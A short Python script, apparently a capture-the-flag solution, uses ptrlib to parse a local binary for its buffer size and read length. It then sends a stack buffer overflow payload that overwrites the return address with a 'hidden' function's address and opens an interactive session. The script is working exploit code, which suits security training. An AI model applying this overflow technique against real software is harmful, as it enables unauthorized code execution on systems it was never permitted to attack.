from ptrlib import *
import time

with open("a.out", "rb") as f:
    binary = f.read()
sock = Process("./a.out")

elf = ELF("./a.out")

ofs = binary.index(b'\xa1' + p32(elf.symbol('check')))
depth = u32(binary[ofs-4:ofs])
ofs = binary.index(b'\x50\x6a\x00')
size = u32(binary[ofs-10:ofs-6])
ofs = next(elf.find('gogo : \0')) + 8
ofs += 4 - (ofs % 4)
banned = binary[ofs:binary.index(b'\0', ofs)]

logger.info("buffer size = " + hex(depth))
logger.info("read size = " + hex(size))
logger.info(b"banned characters = " + banned)

if size >= depth + 8:
    payload = b'A' * depth
    payload += b'BBBB'
    payload += p32(elf.symbol('hidden'))
else:
    logger.error("Bad luck!")
    exit()
sock.sendafter(": ", payload)
time.sleep(0.1)
sock.sendlineafter("!!", "awk")

sock.interactive()
